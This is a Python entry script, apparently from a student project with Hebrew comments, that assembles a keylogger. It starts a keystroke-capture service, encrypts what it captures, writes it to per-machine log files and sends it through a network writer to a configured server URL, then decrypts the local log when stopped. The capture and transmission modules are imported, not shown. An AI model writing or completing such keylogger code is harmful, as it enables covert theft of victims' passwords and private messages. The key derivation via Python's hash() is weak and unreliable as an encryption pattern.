import time
import logging
from datetime import datetime
from services.KeyLoggerService import Keyloggerservice
from services.file_writer import FileWriter
from services.networkwriter import NetworkWriter
from encryption.encryptor import Encryptor
from managers.keyLoggerManager import KeyloggerManager
from config import Config

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


def main():
    # קבלת מפתח הצפנה
    encryption_key = Config.ENCRYPTION_KEY
    if isinstance(encryption_key, str):
        encryption_key = hash(encryption_key) % 65536

    encryptor = Encryptor(key=encryption_key)

    # כתיבה לקובץ
    file_writer = FileWriter(Config.LOG_DIRECTORY)

    print(f"Config.SERVER_URL = {Config.SERVER_URL}")


    # כתיבה לשרת (הפעל אם יש לך Backend פעיל)
    network_writer = NetworkWriter(
        key=encryption_key,
        server_url=Config.SERVER_URL
    )

    # שירות לוגים
    keylogger = Keyloggerservice()

    # מנהל לוגים
    manager = KeyloggerManager(
        keylogger_service=keylogger,
        encryptor=encryptor,
        file_writer=file_writer,
        network_writer=network_writer
    )

    logging.info("🚀 KeyLogger Manager התחיל לרוץ...")
    manager.start()

    try:
        while manager.is_running():
            time.sleep(Config.UPDATE_INTERVAL)

    except KeyboardInterrupt:
        logging.info("⏹ עוצר את KeyLogger Manager...")
        manager.stop()

        # ---- פענוח הקובץ אחרי העצירה ----
        try:
            log_file = f"{Config.LOG_DIRECTORY}/{Config.MACHINE_NAME}/log_{datetime.now().strftime('%Y-%m-%d')}.txt"
            with open(log_file, "r", encoding="utf-8") as f:
                lines = f.readlines()

            decrypted_lines = [encryptor.decrypt(line.strip()) for line in lines if line.strip()]
            decrypted_data = "\n".join(decrypted_lines)

            print("\n--- Decrypted File Content ---")
            print(decrypted_data)

            with open("decrypted_output.txt", "w", encoding="utf-8") as f:
                f.write(decrypted_data)

            print("\n✅ Decrypted content saved to decrypted_output.txt")

        except Exception as e:
            print(f"⚠ Error decrypting file: {e}")


if __name__ == "__main__":
    main()
